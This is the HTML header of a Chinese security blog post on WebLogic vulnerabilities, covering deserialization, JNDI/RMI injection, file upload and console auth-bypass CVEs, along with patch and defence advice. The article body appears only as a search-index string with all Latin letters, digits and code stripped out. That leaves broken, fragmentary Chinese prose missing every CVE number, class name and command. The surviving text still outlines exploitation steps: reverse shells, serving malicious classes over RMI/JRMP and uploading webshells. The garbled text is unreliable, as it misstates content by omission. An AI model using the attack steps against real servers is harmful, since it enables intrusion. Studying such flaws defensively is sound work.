<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Weblogic常见安全漏洞 | 高木のBlog</title><meta name="keywords" content="漏洞复现,渗透测试,中间件,java,反序列化"><meta name="author" content="Takake"><meta name="copyright" content="Takake"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Weblogic常见安全漏洞"><meta name="application-name" content="Weblogic常见安全漏洞"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Weblogic常见安全漏洞"><meta property="og:url" content="https://blog.takake.com/posts/64101/index.html"><meta property="og:site_name" content="高木のBlog"><meta property="og:description" content="常见漏洞以下是WebLogic常见的安全漏洞列表，按类型和影响分类： 1. 反序列化漏洞 CVE-2017-3506    描述：XMLDecoder反序列化漏洞，允许远程代码执行（RCE）。 影响：攻击者通过构造恶意XML数据执行任意命令。   CVE-2017-10271    描述：CVE-2"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/oracle-weblogic.png?x-oss-process=style/img-to-webp"><meta property="article:author" content="Takake"><meta property="article:tag" content="技术,OpenAI,网络安全,hacker,ChatGPT,人工智能,WEB渗透测试,黑客,分享,服务器,WEB安全,红队,蓝队,"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/oracle-weblogic.png?x-oss-process=style/img-to-webp"><meta name="description" content="常见漏洞以下是WebLogic常见的安全漏洞列表，按类型和影响分类： 1. 反序列化漏洞 CVE-2017-3506    描述：XMLDecoder反序列化漏洞，允许远程代码执行（RCE）。 影响：攻击者通过构造恶意XML数据执行任意命令。   CVE-2017-10271    描述：CVE-2"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://blog.takake.com/posts/64101/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/cdn/lib/css/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"GPT-4.0-turbo","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3GpafT7n8yHKUbXT","LingQueMonitorID":"3GpatLJgdLFKhspS"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: 'https://takake.netlify.app/.netlify/functions/twikoo',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: {"mode":null,"api":null,"cover_change":true},
  authorStatus: {"skills":["🤖️ 人工智能爱好者","🔍 分享与热心帮助","🔨 删库跑路一条龙","🤝 网络安全从业者","🏃 脚踏实地行动派","🧱 团队小组发动机"]},
  algolia: {"appId":"6ECK9ICH9Y","apiKey":"4d7d6edad6ebd6c982ea423b6b573b1c","indexName":"my_hexo","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Takake","link":"链接: ","source":"来源: 高木のBlog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: true,
  shortcutKey: undefined,
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: '高木のBlog',
  title: 'Weblogic常见安全漏洞',
  postAI: 'WebLogic存在多类高危漏洞：反序列化（CVE-2017-10271、CVE-2020-2551）、权限绕过（CVE-2020-14882/14883）、JNDI注入（CVE-2023-21839）及文件上传（CVE-2018-2894）。攻击者通过T3/IIOP协议或HTTP接口实现RCE，部分漏洞需出网（如JRMP/JNDI）。防御需禁用T3/IIOP、升级补丁、强化访问控制，并监控异常反序列化请求。',
  pageFillDescription: '常见漏洞, 1. 反序列化漏洞, 2. IIOPx2FT3协议反序列化漏洞, 3. 未经身份验证的远程代码执行（RCE）, 4. 服务器端请求伪造（SSRF）, 5. 权限提升漏洞, 6. 管理控制台漏洞, 7. 第三方库漏洞, 8. 其他高危漏洞, 缓解建议, 漏洞细节, 1.CVE-2017-3506, 1. 漏洞背景, 2. 漏洞触发原理, 核心代码流程, 恶意 XML 构造, 3. 代码审计要点, 审计关键点, 漏洞调用链分析, 4. 修复方案与审计验证, 补丁分析, 修复验证, 5. 总结与审计建议, 2.CVE-2017-10271, 一、漏洞背景, 二、漏洞原理分析, 1. 漏洞触发流程, 2. 补丁绕过逻辑, 三、漏洞复现, 1. 环境搭建, 2. 漏洞验证与利用, 3. 自动化工具利用, 二、可利用的 URL 列表, 三、注意事项, 3.CVE-2019-2725, 1. 漏洞背景, 2. 漏洞原理, (1) 核心触发流程, (2) 补丁绕过机制, 3. 代码审计要点, (1) 反序列化入口, (2) 补丁验证, (3) 利用链分析, 4. 漏洞修复建议, 5. 总结, 4.CVE-2018-2628, 一、漏洞背景, 二、漏洞原理, 1. 触发机制, 2. 漏洞利用链, 三、代码审计要点, 1. 审计关键路径, 2. 补丁有效性验证, 四、漏洞利用流程, 一、环境准备, 二、漏洞检测, 三、攻击流程, 五、攻击阶段流程, 阶段 1：触发反序列化, 阶段 2：JRMP 协议交互, 阶段 3：执行恶意代码, 六、漏洞修复与缓解, 七、总结, 5.CVE-2020-2883, 1. 漏洞背景, 2. 漏洞核心原理, (1) 反序列化入口点, (2) 漏洞利用链（Gadget Chain）, (3) 绕过补丁机制, 3. 漏洞触发流程, 4. 关键代码分析, (1) 反序列化入口, (2) 利用链构造, (3) 命令执行, 5. 补丁与防御, (1) 官方补丁, (2) 缓解措施, 6.漏洞复现, （1） PoC, （2）利用命令, 7. 总结, 6.CVE-2020-2551, 1. 漏洞背景与影响范围, 2. 漏洞核心原理, (1) 反序列化入口点, (2) 利用链构造, (3) 黑名单绕过机制, 3. 漏洞利用流程, 4. 补丁与防御措施, 5. 技术意义与启示, 6.漏洞复现流程, 一、环境准备, 二、漏洞利用步骤, 1. 生成恶意类文件, 2. 启动 HTTP 服务托管恶意类, 3. 启动恶意 RMI 服务, 4. 发送 Payload 触发漏洞, 三、验证漏洞利用, 7.CVE-2018-2894, 1. 漏洞背景与入口点, 2. 漏洞触发机制, 3. 漏洞利用条件, 4. 漏洞技术细节, 5. 防御与修复建议, 6. 漏洞影响与意义, 8.CVE-2020-14882, 1. 漏洞背景与影响, 2. 核心原理分析, 2.1 静态资源路径校验缺陷, 2.2 请求分派与权限校验流程, 2.3 生命周期触发点, 3. 漏洞利用链示例, 3.1 权限绕过（CVE-2020-14882）, 4. 补丁与修复机制, 5. 总结, 9.CVE-2020-14883, 1. 漏洞背景与定位, 2. 核心原理分析, 2.1 漏洞触发点, 2.2 关键代码流程, 3. 利用链与攻击场景, 3.1 利用条件, 3.2 典型攻击步骤, 4. 补丁与修复机制, 5. 总结与防御建议, CVE-2023-21839, 1. 漏洞背景与影响, 2. 核心原理分析, 2.1 漏洞触发机制, 2.2 关键组件缺陷, 3. 漏洞利用链, 3.1 典型攻击步骤, 3.2 工具依赖, 4.漏洞利用, 方式一：使用自动化 PoC 工具, 方式二：手动编写 Java PoC, 4. 修复与缓解措施, 4.1 官方补丁, 4.2 临时缓解方案, 5. 总结与启示, Weblogic综合利用, 1.中间件扫描服务信息收集, 2.综合利用工具, T3协议和IIOP协议对比, 1. 协议概述, 2. 核心特性对比, 3. 安全性对比, 4. 典型漏洞案例, 5. 适用场景, 6. 配置与加固建议, 总结, Weblogic漏洞总结, XMLDecoder组件相关CVE, 1. CVE-2017-3506, 2. CVE-2017-10271, 3. CVE-2019-2725, 4. CVE-2019-2729, WebLogic 其他常见漏洞分类总结, 1. 反序列化漏洞, 2. 未授权访问x2F权限绕过, 3. 文件上传漏洞, 4. SSRF（服务器端请求伪造), 5. 远程代码执行（RCE）, 6. 配置错误, 7. 信息泄露, 防御建议, 汇总归类常见漏洞以下是常见的安全漏洞列表按类型和影响分类反序列化漏洞描述反序列化漏洞允许远程代码执行影响攻击者通过构造恶意数据执行任意命令描述的补丁绕过同样通过触发描述组件反序列化漏洞影响及版本描述通过协议的反序列化漏洞攻击者可在未授权下远程执行代码和描述通过控制台未授权绕过再结合的远程加载文件实现历史补丁关联背景年未完全修复的漏洞后续引发影响通过协议远程执行代码需结合后续补丁彻底修复注入关联漏洞补丁未完全修复的遗留问题影响版本漏洞原理对象在远程查询时触发二次注入攻击者通过协议接管服务器协议反序列化漏洞描述首个公开的反序列化漏洞利用链实现类型反序列化漏洞影响版本等原理注册表通过协议通信未校验反序列化对象攻击者可利用触发远程代码执行关联协议利用工具的类型协议反序列化影响版本等原理协议处理类的反序列化时绕过黑名单过滤利用和协议下发恶意代码关键点绕过对接口的校验触发二次反序列化评分严重类型协议补丁绕过漏洞影响版本等原理的补丁未完全覆盖所有利用链攻击者通过新的反序列化路径如绕过防御关联协议修复建议升级至年月关键补丁更新类型协议反序列化影响版本等原理通过协议与协议共用反序列化逻辑触发类的反序列化漏洞关联协议利用工具或定制化类型核心组件反序列化影响版本等原理组件的反序列化漏洞通过协议触发允许未授权攻击者执行命令关联协议评分严重漏洞类型协议反序列化漏洞影响版本描述利用黑名单未覆盖的类构造恶意序列化数据通过或协议触发反序列化实现关联协议和漏洞类型协议反序列化漏洞影响版本描述通过协议绕过反序列化防护机制攻击者可远程执行代码这两个漏洞常与一同被提及修复方式应用安全补丁评分严重影响版本漏洞原理通过协议的反序列化漏洞未经身份验证的攻击者可远程执行任意代码完全控制服务器修复方案官方已发布补丁建议禁用协议作为临时缓解措施未经身份验证的远程代码执行描述通过协议绕过身份验证结合权限提升实现未授权描述组件漏洞允许未授权攻击者接管服务器服务器端请求伪造描述未授权漏洞攻击者可探测内网服务或发起进一步攻击权限提升漏洞描述核心组件漏洞攻击者可通过构造数据提升权限至管理员管理控制台漏洞弱口令默认配置风险默认管理员账户如未修改易被暴力破解描述控制台配置错误导致需认证用户利用第三方库漏洞描述若使用受影响版本的攻击者可通过日志注入实现其他高危漏洞描述身份验证绕过漏洞影响多版本描述远程代码执行漏洞需攻击者构造特定请求缓解建议及时更新补丁定期应用官方安全补丁禁用高危协议关闭不必要的协议或限制访问强化身份验证修改默认凭据启用强密码策略网络隔离将部署在内网限制公网暴露最小化权限以非特权用户运行服务避免使用权限这些漏洞多数已被官方修复但未及时更新的系统仍面临高风险建议结合漏洞扫描工具如定期检查环境安全性漏洞细节漏洞背景是中组件的反序列化漏洞攻击者通过构造恶意请求触发反序列化实现远程代码执行该漏洞影响等版本漏洞触发原理核心代码流程漏洞触发路径涉及以下关键代码段请求入口攻击者发送请求到等路径请求头中包含恶意数据解析流程的方法调用将请求中的数据传入类的构造函数反序列化执行直接调用反序列化未经过滤的数据导致恶意代码执行关键代码段构造函数直接反序列化输入流恶意构造攻击者构造的利用执行系统命令例如攻击者恶意脚本该通过启动执行远程下载的恶意脚本代码审计要点审计关键点反序列化入口检查的使用场景尤其是用户可控的输入是否直接传入反序列化方法过滤机制是否对标签如和类名如进行黑名单过滤补丁绕过风险初始补丁仅过滤标签后续通过或标签绕过需验证黑名单的完整性漏洞调用链分析触发点处理请求头反序列化路径通过调试工具如或调试器追踪的调用栈确认是否触发方法修复方案与审计验证补丁分析针对的补丁在中添加了方法使用检查中是否包含标签检查中是否存在标签但该补丁因仅过滤单一标签而被绕过后续补丁扩展了黑名单如等修复验证组件删除删除及相关目录如网络控制限制路径的访问权限禁止外网直接访问补丁升级确认已应用官方补丁如年月关键补丁总结与审计建议漏洞本质反序列化未过滤用户输入的恶意标签审计重点关注所有解析逻辑尤其是涉及动态类加载或命令执行的代码路径防御建议使用白名单机制替代黑名单限制可反序列化的类升级至最新版本定期进行漏洞扫描如使用通过代码审计可深入理解漏洞触发机制结合补丁分析及修复验证可有效防御此类反序列化漏洞一漏洞背景是中组件的反序列化漏洞允许攻击者通过构造恶意请求触发远程代码执行该漏洞是的补丁绕过版本影响和等版本二漏洞原理分析漏洞触发流程入口请求攻击者向的服务端点如发送格式的请求请求头中包含恶意数据解析与反序列化的方法处理请求通过方法提取头部的标签内容并将其传递给类反序列化直接调用对未经验证的数据进行反序列化导致攻击者构造的恶意代码如被执行关键代码段构造函数未过滤直接反序列化补丁绕过逻辑的修复缺陷初始补丁仅过滤标签但攻击者可通过其他标签如绕过限制恶意构造利用启动执行命令或通过写入例如攻击者端口运行该触发执行反弹命令三漏洞复现环境搭建使用快速部署下载项目并进入漏洞目录启动后访问目标若返回页面则说明服务正常手动搭建环境适用于系统如需安装版本及兼容如漏洞验证与利用检测漏洞存在性访问目标若返回如下格式页面则可能存在漏洞构造恶意请求反弹使用或脚本发送包含以下的请求目标注意需在攻击机开启监听端口如需要对特殊中的特殊字符进行实体编码防止其特殊含义写入修改中的为写入文件访问目标验证是否写入成功注意目录是根据部署时间和应用名称随机生成的短具体利用时需利用爆破或者目录泄露自动化工具利用使用脚本批量检测或执行命令例如上述反弹的内容漏洞存在且利用成功二可利用的列表以下为触发漏洞的核心需通过请求发送恶意数据主要利用端点描述标准漏洞触发路径所有复现流程均基于此其他潜在端点三注意事项协议与端口默认监听端口为但实际环境可能配置为等其他端口确保目标服务器未禁用协议可通过网络策略限制路径差异写入路径因版本和安装目录不同而变化需通过调试确定具体路径如随机生成的目录名防御建议删除组件或限制其访问权限及时应用官方补丁如年月补丁漏洞背景是服务器的反序列化远程代码执行漏洞影响和组件该漏洞通过绕过补丁的黑名单过滤机制利用反序列化未经验证的输入数据导致攻击者可在未授权下执行任意命令漏洞原理核心触发流程入口点攻击者向的异步通信服务端点如发送恶意请求请求中包含构造的数据解析的处理请求将数据传递给类反序列化执行直接调用对恶意进行反序列化触发或类的恶意代码执行关键代码段构造函数未过滤直接反序列化补丁绕过机制历史补丁缺陷补丁仅过滤了标签但允许和标签通过攻击载荷构造通过和标签结合或类绕过黑名单限制示例攻击者代码审计要点反序列化入口组件路径检查和中的类确认是否直接调用且未过滤输入请求处理链跟踪的调用链验证数据是否未经校验直接反序列化补丁验证黑名单检查确认补丁是否扩展了黑名单如新增对属性的过滤并验证和标签的解析逻辑是否存在漏洞长度限制绕过在补丁中限制了的属性如不得大于需检查是否可通过构造合法长度绕过利用链分析类该类的反序列化过程中通过和直接调用若版本可利用生成恶意对象日志与调试信息通过调试器如在或处设置断点验证是否触发恶意代码执行漏洞修复建议补丁升级应用官方补丁如年月紧急补丁彻底修复反序列化逻辑组件删除删除和文件并重启服务升级将默认的升级至以上版本避免原生反序列化漏洞访问控制通过防火墙或限制对和路径的访问总结的本质是黑名单过滤机制不完善攻击者通过构造和标签绕过补丁限制代码审计需重点关注解析流程中的输入校验和反序列化触发点结合补丁差异分析漏洞成因该漏洞的广泛利用如挖矿木马内网渗透凸显了及时升级和组件管理的重要性一漏洞背景是的高危反序列化漏洞允许攻击者通过协议发送恶意反序列化数据触发远程代码执行该漏洞的核心问题在于对远程方法调用接口的校验不充分结合协议绕过黑名单限制导致未授权攻击者可接管服务器二漏洞原理触发机制协议入口默认开启的协议用于支持分布式通信但未对传入的请求进行严格的序列化数据校验攻击者通过协议发送构造的恶意数据包触发反序列化流程反序列化绕过的类在反序列化时调用方法仅校验接口而攻击者可通过其他接口如绕过黑名单限制利用链构造利用工具生成包含恶意命令的序列化对象如通过和类建立与攻击机服务的连接实现二次反序列化加载恶意序列化对象加载并执行远程恶意代码关键代码段反序列化绕过点方法仅校验特定接口漏洞利用链攻击流程攻击机启动服务监听端口生成恶意序列化对象目标接收到构造的请求后反序列化触发连接请求攻击机通过服务下发恶意代码执行系统命令如反弹或写入三代码审计要点审计关键路径反序列化入口检查类中的方法确认是否对输入数据进行了严格的校验黑名单过滤机制补丁中新增的类会过滤等危险类但需验证是否覆盖完整的反射链如未被完全过滤确认黑名单是否动态加载避免补丁文件未生效如未正确更新协议控制逻辑检查协议的网络访问权限配置如规则是否限制外部访问补丁有效性验证补丁分析官方补丁通过扩展黑名单和增强的校验逻辑修复漏洞但早期版本可能因兼容性问题如仍存在绕过风险绕过风险若反序列化链中未直接使用黑名单类如仅在底层调用补丁可能失效需结合调试工具跟踪反序列化过程确认所有关键节点是否被覆盖四漏洞利用流程一环境准备靶机环境搭建使用的环境快速部署漏洞靶机启动后访问靶机确认服务正常运行攻击机工具准备用于生成反序列化和启动监听服务下载地址脚本如或示例脚本环境需避免高版本兼容性问题如无法运行编写将改编为且可自定义文件的实现代码如下生成二漏洞检测确认协议开放使用扫描目标是否开启协议靶机若返回和版本信息则存在漏洞风险三攻击流程启动监听服务在攻击机上运行启动监听指定端口并绑定恶意命令编码命令示例反弹说明需将原始命令编码绕过的管道符限制生成并发送使用脚本向目标发送构造的协议数据包参数说明为文件的路径指定类型可选或验证攻击结果反弹验证在攻击机开启监听成功获取即表示漏洞利用成功五攻击阶段流程阶段触发反序列化构造生成的代理对象被反序列化后触发的逻辑绕过校验的补丁仅拦截了直接使用接口的反序列化操作但的调用链并未被完全过滤阶段协议交互建立连接尝试连接到攻击机指定的服务通过中的二次反序列化攻击机的服务返回一个真正的恶意对象如在接收此对象时再次触发反序列化阶段执行恶意代码绕过黑名单二次反序列化的对象如通过其他利用链非接口绕过黑名单代码执行最终触发或类似逻辑执行系统命令六漏洞修复与缓解官方补丁升级安装年月发布的补丁如修复反序列化逻辑并扩展黑名单临时缓解措施禁用协议或限制访问通过配置规则删除非必要的和组件环境加固升级至以上版本避免低版本反序列化漏洞定期扫描日志监控异常连接请求七总结的本质是反序列化黑名单过滤机制不完善结合协议绕过实现远程代码执行代码审计需重点关注协议处理逻辑反序列化入口校验及补丁覆盖范围实际利用中攻击者常通过服务与交互因此网络隔离和协议控制是防御的关键漏洞背景是中的一个高危反序列化远程代码执行漏洞影响版本包括攻击者通过协议发送恶意序列化数据绕过黑名单过滤机制触发未授权的远程代码执行漏洞核心原理反序列化入口点在处理协议请求时对传入的序列化数据执行反序列化操作漏洞的关键在于以下两点未严格校验输入数据未对反序列化的类进行充分校验导致恶意对象被解析利用链绕过黑名单攻击者通过构造未被黑名单覆盖的类组合链触发代码执行漏洞利用链的利用链基于的变种或其他内部类的组合典型利用链如下触发点类例如其方法在反序列化时会调用的比较操作恶意比较器例如通过反射调用的方法代码执行类例如或最终调用执行系统命令示例利用链绕过补丁机制黑名单绕过在修复时仅将部分危险类如加入黑名单利用未被覆盖的类如构造新利用链动态代理与反射通过等类动态代理恶意对象绕过静态检测漏洞触发流程构造恶意序列化对象使用或自定义工具生成包含命令执行逻辑的序列化数据示例命令编码命令通过协议发送协议默认监听端口攻击者将恶意数据封装为协议数据包发送至目标服务器反序列化触发代码执行反序列化恶意数据时依次触发利用链中的类方法最终执行系统命令关键代码分析反序列化入口的类处理协议数据调用方法反序列化输入流利用链构造攻击者构造的恶意对象利用触发反射恶意触发触发比较操作反射调用命令执行最终通过反射调用类执行命令恶意命令补丁与防御官方补丁通过以下方式修复漏洞扩展黑名单将等类加入反序列化黑名单增强协议过滤限制协议的反序列化操作缓解措施禁用协议修改升级至最新版本应用年月及之后的关键补丁网络隔离限制端口的公网访问漏洞复现利用命令监听总结的核心原理是通过协议发送恶意序列化数据利用反序列化机制中未被覆盖的类链绕过黑名单触发远程代码执行其危害性在于无需身份验证且能完全控制服务器防御需结合补丁升级协议禁用和网络隔离同时持续监控反序列化攻击向量是中的一个高危反序列化远程代码执行漏洞其核心原理涉及协议的反序列化缺陷和黑名单过滤机制的不完善以下是漏洞的详细解析漏洞背景与影响范围漏洞编号评分为严重利用难度低影响版本协议关联漏洞通过触发该协议用于对象通信默认在的端口开放漏洞核心原理反序列化入口点在处理协议请求时会对传入的序列化数据执行反序列化操作具体流程如下请求触发攻击者通过绑定恶意对象至服务端例如使用初始化上下文反序列化调用链服务端在解析请求时会调用类的方法最终通过读取并反序列化恶意数据利用链构造漏洞的核心利用类是属于框架其父类已被加入黑名单但自身未被过滤攻击者通过以下步骤构造利用链动态代理封装使用将封装为接口的动态代理对象基于注入通过设置恶意地址触发目标服务器从攻击者控制的服务器加载恶意类反序列化执行反序列化时由于未递归检查父类导致被成功解析最终通过注入执行远程代码黑名单绕过机制过滤机制缺陷对协议的反序列化检查仅针对当前类名未递归验证父类因此即使在黑名单中其子类仍可通过检查动态代理绕过通过动态代理如接口隐藏真实类名绕过静态黑名单检测漏洞利用流程构造恶意序列化对象使用生成的序列化对象并关联恶意服务地址如发送请求通过方法将恶意对象绑定至目标的服务端口触发反序列化解析请求时触发的反序列化操作加载并执行服务中的恶意类如远程加载执行系统命令补丁与防御措施官方补丁在年月发布的补丁中扩展了黑名单并修复了类的反序列化逻辑添加递归类名检查临时缓解方案禁用协议在控制台中取消启用选项并重启服务网络隔离限制端口的公网访问仅允许可信通信技术意义与启示协议安全性协议的反序列化漏洞再次凸显了分布式协议设计中输入校验的重要性防御纵深单纯依赖黑名单的防御机制存在局限性需结合白名单行为监控等多层防护漏洞利用趋势该漏洞的公开利用代码如结合表明攻击者正越来越多地利用反序列化漏洞实现高级持久化攻击漏洞复现流程以下是漏洞复现的详细流程结合多篇技术文档和实践总结一环境准备靶机环境推荐使用的环境已适配复现确保服务运行在端口访问靶机验证服务正常攻击机环境环境需安装部分工具需编译工具准备用于启动恶意服务下载地址发送工具需从开源项目编译或下载预编译版本二漏洞利用步骤生成恶意类文件编写恶意类如示例弹出计算器或执行其他命令反弹示例攻击机端口编译为文件需兼容低版本启动服务托管恶意类在恶意类所在目录启动服务或启动恶意服务使用启动服务攻击机攻击机指向托管的服务发送触发漏洞使用发送恶意请求靶机攻击机参数说明靶机目标的服务地址攻击机恶意服务地址三验证漏洞利用观察攻击机日志若触发了恶意类加载服务会记录对的请求执行效果验证靶机成功会弹出计算器靶机通过监听指定端口获取反弹日志排查检查日志或若出现相关错误表明漏洞触发成功漏洞背景与入口点是中的一个高危任意文件上传漏洞允许攻击者通过未授权页面直接上传恶意文件如并获取服务器权限漏洞的核心入口点为管理端的两个未授权接口这两个页面在开发模式下默认开启而在生产模式下需手动启用服务测试页选项漏洞触发机制漏洞的核心原理在于对用户设置的工作目录缺乏安全校验具体流程如下工作目录修改攻击者通过页面将设置为应用的静态资源目录如该目录无需权限即可访问关键点程序会自动将旧目录内容复制到新目录但未限制路径合法性导致攻击者可指定任意可写路径文件上传逻辑在或页面的安全选项中攻击者上传恶意文件如文件名生成规则为时间戳文件名如其中时间戳通过请求参数或返回包获取文件保存路径上传的文件被保存至目录下的子目录路径为目标时间戳文件名由于该路径无需权限攻击者可直接访问并执行恶意文件漏洞利用条件目标环境版本为开发模式或生产模式下启用了服务测试页选项攻击前提需获取管理端登录凭据弱口令或通过日志泄露漏洞技术细节路径校验缺失在处理修改时未验证路径合法性攻击者可将其指向任意可写目录如静态资源目录程序自动复制文件时未过滤危险文件类型如文件名拼接漏洞文件名由参数与上传文件名拼接生成未进行过滤导致攻击者可控制最终文件名权限控制缺陷和页面在开发模式下无需认证即可访问生产模式下虽需认证但若攻击者获取凭据仍可触发漏洞防御与修复建议官方补丁升级至年月及之后的版本修复路径校验和文件名生成逻辑访问控制禁用和页面的未授权访问在生产模式下关闭服务测试页功能网络隔离限制管理端端口的公网暴露入侵检测部署监控对路径的异常请求漏洞影响与意义该漏洞评分为攻击者可利用低权限账户或弱口令直接上传导致服务器完全沦陷其技术意义在于揭示了中间件管理界面设计中的权限校验缺陷以及路径控制不严导致的文件操作风险以下是关于漏洞核心原理的详细解析结合多个技术分析来源总结其攻击路径与关键机制漏洞背景与影响是管理控制台中的一个权限绕过漏洞允许未经身份验证的攻击者直接访问后台管理界面结合后台任意命令执行漏洞攻击者可构造完整的利用链实现远程代码执行并完全控制目标服务器影响版本核心原理分析静态资源路径校验缺陷管理控制台在处理静态资源请求时如未对请求路径进行严格的权限验证攻击者通过构造二次编码的路径穿越符号即将请求伪装为静态资源访问绕过权限校验逻辑示例攻击此路径解码后为指向管理控制台的核心入口文件而误认为该请求属于静态资源目录从而跳过身份验证请求分派与权限校验流程静态资源白名单机制的模块维护了一个静态资源列表如文件标记为无需认证攻击者通过路径穿越使请求匹配到白名单中的静态资源路径触发绕过权限检查分派逻辑请求最终被分派至并进一步调用处理文件由于权限校验已绕过攻击者可加载并解析文件进入后台管理界面生命周期触发点通过访问文件会触发控件树的生命周期方法如在解析控件树时若请求参数包含系统会调用方法执行从而触发后续的代码执行逻辑需结合漏洞利用链示例权限绕过构造恶意利用路径穿越访问管理后台绕过结果直接进入部署管理页面但权限受限无法直接部署应用可集合实现远程补丁与修复机制通过以下方式修复漏洞路径黑名单检测增加对等路径穿越符号的过滤权限校验增强在处理前强制验证用户身份静态资源列表更新限制非必要路径的属性总结的本质是对静态资源路径的权限校验逻辑缺陷结合编码与路径穿越实现未授权访问其危害性在于为后续代码执行漏洞提供了攻击入口形成完整的利用链防御建议包括及时安装官方补丁禁用未使用的协议端口并严格限制管理控制台的访问来源以下是关于漏洞核心原理的深度解析结合多个技术分析来源总结其攻击路径与关键机制漏洞背景与定位是管理控制台中的远程命令执行漏洞需与权限绕过漏洞结合形成完整的利用链攻击者通过构造特殊的请求在未授权的情况下直接执行系统命令最终完全控制目标服务器影响版本核心原理分析漏洞触发点漏洞的核心在于管理控制台对请求参数的处理逻辑存在缺陷当攻击者通过绕过权限验证后可利用参数注入恶意类名和代码触发以下两类关键组件的反序列化或类加载过程适用版本低版本无此类机制通过反射调用类的构造函数传入恶意代码如直接执行系统命令示例利用适用版本全版本通过框架漏洞机制加载远程文件利用的依赖注入机制实例化通过触发命令执行恶意示例攻击机端口关键代码流程请求分派绕过权限后请求被分派至最终调用处理文件触发控件树的生命周期方法如参数解析与类加载参数通过反序列化机制加载指定类类在初始化时会解析远程文件并执行其中定义的逻辑安全机制缺陷黑名单缺失未对和进行有效拦截输入验证不足未对参数的内容进行合法性校验导致任意类实例化利用链与攻击场景利用条件前置条件需通过绕过权限访问后台网络要求类需存在于目标版本中仅限高版本需目标服务器能访问攻击者提供的文件需出网典型攻击步骤权限绕过构造路径穿越访问管理后台命令执行方式一直接注入命令如创建文件或反弹方式二加载编写一个和利用链类似的文件启动服务部署恶意文件并触发加载端口监听补丁与修复机制通过以下方式修复漏洞类黑名单更新将和加入反序列化黑名单输入过滤增强对参数进行严格校验禁止加载未授权的类协议限制建议禁用协议或限制访问来源总结与防御建议的根源在于对用户输入的控制不足结合高危类加载机制导致其危害性在未授权访问漏洞的加持下被放大形成完整的攻击链防御建议补丁升级及时安装官方季度补丁协议加固禁用协议或配置白名单网络隔离限制管理控制台的访问范围避免暴露在公网以下是